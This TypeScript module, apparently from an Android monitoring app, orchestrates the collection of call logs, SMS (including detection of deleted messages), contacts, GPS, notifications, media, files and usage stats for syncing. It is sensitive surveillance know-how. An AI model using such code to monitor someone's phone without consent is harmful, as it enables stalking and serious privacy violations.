import { Permissions } from '@/lib/permissions'
import { collectCallLogs } from '@/collectors/CallLogCollector'
import { collectSms, detectSmsDeleted, startSmsObserver, stopSmsObserver } from '@/collectors/SmsCollector'
import { collectContacts } from '@/collectors/ContactsCollector'
import { collectInstalledApps } from '@/collectors/InstalledAppsCollector'
import { startGpsCollection, stopGpsCollection, isGpsCollecting } from '@/collectors/GpsCollector'
import {
  startNotificationCollection,
  stopNotificationCollection,
  isNotificationCollecting,
  isNotificationListenerEnabled,
} from '@/collectors/NotificationCollector'
import { collectUsageStats, hasUsageStatsPermission } from '@/collectors/UsageStatsCollector'
import { collectMedia } from '@/collectors/MediaCollector'
import { collectFiles } from '@/collectors/FileCollector'
import {
  startGeofenceCollection,
  stopGeofenceCollection,
  isGeofenceCollecting,
  syncGeofencesFromApi,
} from '@/collectors/GeofenceCollector'
import { RestrictionEngine } from '@/services/RestrictionEngine'

function m(name: string): boolean {
  return RestrictionEngine.isModuleEnabled(name)
}

export type CollectorStats = {
  // Phase 2
  calls: number
  sms: number
  contacts: number
  apps: number
  gpsActive: boolean
  // Phase 4
  media: number
  files: number
  usageStats: number
  notificationsActive: boolean
  geofenceActive: boolean
}

export type CollectorPermissions = {
  callLog: boolean
  sms: boolean
  contacts: boolean
  location: boolean
  notificationListener: boolean
  usageStats: boolean
}

let _running = false
let _permissions: CollectorPermissions = {
  callLog: false,
  sms: false,
  contacts: false,
  location: false,
  notificationListener: false,
  usageStats: false,
}

export const CollectorEngine = {
  isRunning(): boolean {
    return _running
  },

  getPermissions(): CollectorPermissions {
    return { ..._permissions }
  },

  async start(): Promise<CollectorStats> {
    if (_running) {
      return CollectorEngine.getStats()
    }

    console.log('[CollectorEngine] Starting...')

    // Request runtime permissions (sequential — Android requirement)
    let runtimePerms = { callLog: false, sms: false, contacts: false, location: false }
    try {
      runtimePerms = await Permissions.requestAllCollectors()
      console.log('[CollectorEngine] Permissions:', JSON.stringify(runtimePerms))
    } catch (err) {
      console.warn('[CollectorEngine] Permission request failed:', err)
    }

    let gpsGranted = false
    try {
      gpsGranted = await Permissions.requestLocationForGps()
    } catch {
      console.warn('[CollectorEngine] GPS permission failed')
    }

    await Permissions.requestMediaPermissions().catch(() => false)

    // Check special permissions (non-blocking)
    const notificationListener = await isNotificationListenerEnabled().catch(() => false)
    const usageStats = await hasUsageStatsPermission().catch(() => false)

    _permissions = { ...runtimePerms, notificationListener, usageStats }

    // Start continuous collectors (respecting module toggles)
    try { if (gpsGranted && m('gps')) startGpsCollection() } catch {}
    try { if (notificationListener && m('notifications')) startNotificationCollection() } catch {}
    try { if (m('geofence')) startGeofenceCollection() } catch {}

    // One-shot initial collection — all wrapped in catch to prevent any single failure from blocking
    const [calls, sms, contacts, apps, media, files, usageStatsCount] = await Promise.all([
      _permissions.callLog && m('calls') ? collectCallLogs().catch(() => 0) : Promise.resolve(0),
      _permissions.sms && m('sms') ? collectSms().catch(() => 0) : Promise.resolve(0),
      _permissions.contacts && m('contacts') ? collectContacts().catch(() => 0) : Promise.resolve(0),
      m('apps') ? collectInstalledApps().catch(() => 0) : Promise.resolve(0),
      m('media') ? collectMedia().catch(() => 0) : Promise.resolve(0),
      m('files') ? collectFiles().catch(() => 0) : Promise.resolve(0),
      usageStats && m('usageStats') ? collectUsageStats().catch(() => 0) : Promise.resolve(0),
    ])

    syncGeofencesFromApi().catch(() => undefined)
    detectSmsDeleted().catch(() => 0)

    // Start SMS ContentObserver for deletion detection
    startSmsObserver(async () => {
      try {
        await collectSms()
        await detectSmsDeleted()
        const { SyncEngine } = await import('@/services/SyncEngine')
        await SyncEngine.sync()
      } catch { /* non-blocking */ }
    })

    _running = true
    console.log('[CollectorEngine] Started — calls:', calls, 'sms:', sms, 'contacts:', contacts)

    return {
      calls, sms, contacts, apps, gpsActive: isGpsCollecting(),
      media, files, usageStats: usageStatsCount,
      notificationsActive: isNotificationCollecting(),
      geofenceActive: isGeofenceCollecting(),
    }
  },

  async refresh(): Promise<CollectorStats> {
    const [calls, sms, contacts, apps, media, files, usageStatsCount] = await Promise.all([
      _permissions.callLog && m('calls') ? collectCallLogs().catch(() => 0) : Promise.resolve(0),
      _permissions.sms && m('sms') ? collectSms().catch(() => 0) : Promise.resolve(0),
      _permissions.contacts && m('contacts') ? collectContacts().catch(() => 0) : Promise.resolve(0),
      m('apps') ? collectInstalledApps().catch(() => 0) : Promise.resolve(0),
      m('media') ? collectMedia().catch(() => 0) : Promise.resolve(0),
      m('files') ? collectFiles().catch(() => 0) : Promise.resolve(0),
      _permissions.usageStats && m('usageStats') ? collectUsageStats().catch(() => 0) : Promise.resolve(0),
    ])
    syncGeofencesFromApi().catch(() => undefined)
    detectSmsDeleted().catch(() => 0)

    return {
      calls, sms, contacts, apps, gpsActive: isGpsCollecting(),
      media, files, usageStats: usageStatsCount,
      notificationsActive: isNotificationCollecting(),
      geofenceActive: isGeofenceCollecting(),
    }
  },

  stop(): void {
    stopGpsCollection()
    stopNotificationCollection()
    stopGeofenceCollection()
    stopSmsObserver()
    _running = false
  },

  getStats(): CollectorStats {
    return {
      calls: 0, sms: 0, contacts: 0, apps: 0, gpsActive: isGpsCollecting(),
      media: 0, files: 0, usageStats: 0,
      notificationsActive: isNotificationCollecting(),
      geofenceActive: isGeofenceCollecting(),
    }
  },
}
